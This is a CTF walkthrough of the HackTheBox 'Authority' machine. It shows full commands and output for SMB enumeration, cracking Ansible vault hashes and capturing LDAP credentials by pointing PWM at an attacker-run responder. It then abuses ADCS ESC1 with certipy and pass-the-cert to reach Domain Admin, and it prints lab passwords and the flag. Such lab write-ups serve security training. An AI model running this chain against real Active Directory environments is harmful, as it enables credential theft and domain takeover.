---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-07-26-authority-hackthebox
tags:
- hackthebox
- windows
- adcs
- ansible
- guest
- enum

title: authority @ HackTheBox
---
Authority is an medium-difficulty machine on [hackthebox.eu](https://www.hackthebox.eu). Initial access is gained through enumerating a guest SMB share, looking through this directory exposes PWM hashes, cracking these and unlocking the vault gives us access to the PWM website. Adding our own LDAP url gives us access to the svc_ldap user. Root is gained by exploiting ESC1, however a slight twist is we have to add our own computer, with that, we can exploit ESC by requesting a certificate which gives us administrator.pfx, extracting the cert and key, we can gain a LDAP shell, by adding our svc_ldap user to the Domain Admins group, we are able to grab the root flag.


## User & Root Flag
This post is a walkthrough for authority, a medium machine on [hackthebox.eu](https://www.hackthebox.eu). <br>
The initial scan (`nmap -Pn -n -sC -sV -p- 10.129.229.56`) shows the following results:
```
┌──(tsunami㉿coffee)-[~]
└─$ nmap -sC -sV -Pn -n -p- 10.129.229.56
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 18:49 EDT
Nmap scan report for 10.129.229.56
Host is up (0.035s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-01 02:50:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-08-01T02:51:25+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-08-01T02:51:26+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-08-01T02:51:25+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-08-01T02:51:26+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-07-30T02:47:25
|_Not valid after:  2027-08-01T14:25:49
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
63020/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-01T02:51:20
|_  start_date: N/A
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
## User

To begin, we start to enumerate the SMB drive with guest access which reveals a share named `Development`.
```
┌──(tsunami㉿coffee)-[~]
└─$ smbmap -u 'Guest' -p '' -H 10.129.229.56

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.229.56:445       Name: authority.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       NO ACCESS
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections 
```
Connecting via smbclient, it reveals a folder named `Automation`
```
┌──(tsunami㉿coffee)-[~]
└─$ smbclient //10.129.229.56/Development -U 'Authority.htb//Guest'
Password for [Guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 17 09:20:38 2023
  ..                                  D        0  Fri Mar 17 09:20:38 2023
  Automation                          D        0  Fri Mar 17 09:20:40 2023

                5888511 blocks of size 4096. 1161535 blocks available
smb: \> 
```

Before I go any further, I quickly enumerated a list of users through RID brute forcing.
```
┌──(tsunami㉿coffee)-[~/Documents/authority]
└─$ nxc smb 10.129.229.56 -u 'Guest' -p '' --rid-brute 4000
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\Guest: 
SMB         10.129.229.56   445    AUTHORITY        498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        500: HTB\Administrator (SidTypeUser)
SMB         10.129.229.56   445    AUTHORITY        501: HTB\Guest (SidTypeUser)
SMB         10.129.229.56   445    AUTHORITY        502: HTB\krbtgt (SidTypeUser)
SMB         10.129.229.56   445    AUTHORITY        512: HTB\Domain Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        513: HTB\Domain Users (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        514: HTB\Domain Guests (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        515: HTB\Domain Computers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        516: HTB\Domain Controllers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        517: HTB\Cert Publishers (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        518: HTB\Schema Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        519: HTB\Enterprise Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        520: HTB\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        521: HTB\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        522: HTB\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        525: HTB\Protected Users (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        526: HTB\Key Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        527: HTB\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        553: HTB\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
SMB         10.129.229.56   445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
SMB         10.129.229.56   445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.229.56   445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser)
```

From this list, we reveal the `svc_ldap` account, we'll keep note of this account for later.
Using this directory, I download everything inside of it.

```
┌──(tsunami㉿coffee)-[~/Documents/authority/ansible]
└─$ smbclient //10.129.229.56/Development -U 'Authority.htb//Guest'
Password for [Guest]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt OFF
smb: \> mget *
```

Checking through the Ansible directory, we find a PWM directory which contains a username and password.

```
┌──(tsunami㉿coffee)-[~/…/Automation/Ansible/PWM/templates]
└─$ cat tomcat-users.xml.j2 
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```

We will keep note of the user names and password however, they won't really come in handy<br>
Looking deeper into the PWM directory, we find what looks to be a protected vault.
```
┌──(tsunami㉿coffee)-[~/…/Automation/Ansible/PWM/defaults]
└─$ cat main.yml 
---
>SNIP<
pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764                                                                                                                                                                                        
```

Doing some research, I find that we can use ansible2john on these hashes.
We have to do these one by one for this to work, eventually we gather 3 hashes.
```
1:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
2:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
3:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

Using john, we are able to crack the passwords.
```
┌──(tsunami㉿coffee)-[~/Documents/authority]
└─$ john ansible_hashes --wordlist=/usr/share/wordlists/rockyou.txt       

Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 256/256 AVX2 8x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 0.01% (ETA: 22:50:23) 0g/s 1505p/s 4517c/s 4517C/s clover..punkrock
!@#$%^&*         (2)     
!@#$%^&*         (1)     
!@#$%^&*         (3)     
3g 0:00:00:32 DONE (2025-07-31 19:48) 0.09316g/s 1237p/s 3711c/s 3711C/s 051790..teamol
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We find that all three hashes are the same password.

Looking through the documentation of Ansible, we find that we can decrypt the vault using the `decrypt` command.
Decrypting the vault, we find two passwords and a username.

```
┌──(tsunami㉿coffee)-[~/…/Automation/Ansible/PWM/defaults]
└─$ cat 3 | ansible-vault decrypt 
Vault password: 
Decryption successful
DevT3st@123                                                                                                                                                                                        
┌──(tsunami㉿coffee)-[~/…/Automation/Ansible/PWM/defaults]
└─$ cat 2 | ansible-vault decrypt 
Vault password: 
Decryption successful
pWm_@dm!N_!23                                                                                                                                                                                        
┌──(tsunami㉿coffee)-[~/…/Automation/Ansible/PWM/defaults]
└─$ cat 1 | ansible-vault decrypt 
Vault password: 
Decryption successful
svc_pwm   
```

Looking through the nmap ports, we find the port `8443` being open, when visiting this site, we find the PWM login page.
![capture-01](capture-01.PNG)

Using the password `DevT3st@123` on the `Configuration Editor`, we successfully login.
Looking through the list of possability's, the LDAP url field looks interesting.
Adding our own URL which targets our IP, we can run responder to catch the request.
![capture-04](capture-04.PNG)
```
URL: http://your_ip:389

responder -I tun0
[LDAP] Cleartext Client   : 10.129.229.56
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```

Using this username and password on evil-winrm, we successfully login.

## svc_ldap
With a little bit of guessing, we can assume this machine will most likely be focused on ADCS.
Using certipy-ad confirms this as we find a vulnerable template.
```
certipy-ad find  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56
>snip<
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
However, one thing to be aware of is the enrolement rights.
```
Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
```
With this, we can only abuse this template by adding our own computer.
The pieces of information we need to abuse ESC1 are:
```
template name: CorpVPN
DNS name: authority.authority.htb
CA: AUTHORITY-CA
```

With this information, we can add our own computer to perform this attack.
```
┌──(tsunami㉿coffee)-[~/Documents/authority/esc1]
└─$ impacket-addcomputer -dc-ip 10.129.229.56 -computer-pass 'CoolBeans123' -computer-name noob 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account noob$ with password CoolBeans123.
```

With the computer added, we can use those credentials to request a certificate.
```
┌──(tsunami㉿coffee)-[~/Documents/authority/esc1]
└─$ certipy-ad req -u 'noob$' -p 'CoolBeans123' -dc-ip 10.129.229.56 -target authority.htb -ca 'AUTHORITY-CA' -upn 'administrator@authority.htb' -template CorpVPN
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'                                                     
```

With the administrator.pfx, we can extract the cert and key.
```
certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
[*] Writing certificate to 'user.crt'

certipy cert -pfx administrator_authority.pfx -nocert -out user.key
[*] Writing private key to 'user.key'
```

However, using evil-winrm would not work with this, an alternative is connecting through ldap by using passthecert.py
```
┌──(tsunami㉿coffee)-[~/Documents/authority/esc1]
└─$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.129.229.56
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# whoami
u:HTB\Administrator
```

With this shell, the easiest way to gain root is by adding the svc_ldap user to Domain Admins.
```
Adding user: svc_ldap to group Domain Admins result: OK
```

With this, we can root.
```
*Evil-WinRM* PS C:\Users> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
HTB\Domain Admins                          Group            S-1-5-21-622327497-3269355298-2248959698-512 Mandatory group, Enabled by default, Enabled group
HTB\Denied RODC Password Replication Group Alias            S-1-5-21-622327497-3269355298-2248959698-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/17/2023   9:31 AM                Administrator
d-r---         8/9/2022   4:35 PM                Public
d-----        3/24/2023  11:27 PM                svc_ldap


*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/10/2022   8:52 PM                .pwm-workpath
d-r---        7/12/2023   1:21 PM                3D Objects
d-r---        7/12/2023   1:21 PM                Contacts
d-r---        7/12/2023   1:21 PM                Desktop
d-r---        7/12/2023   1:21 PM                Documents
d-r---        7/12/2023   1:21 PM                Downloads
d-r---        7/12/2023   1:21 PM                Favorites
d-r---        7/12/2023   1:21 PM                Links
d-r---        7/12/2023   1:21 PM                Music
d-r---        7/12/2023   1:21 PM                Pictures
d-r---        7/12/2023   1:21 PM                Saved Games
d-r---        7/12/2023   1:21 PM                Searches
d-r---        7/12/2023   1:21 PM                Videos
-a----        3/17/2023   9:30 AM          16384 gp.jfm


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
77715d812ebafe7d83339b36c4808600
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```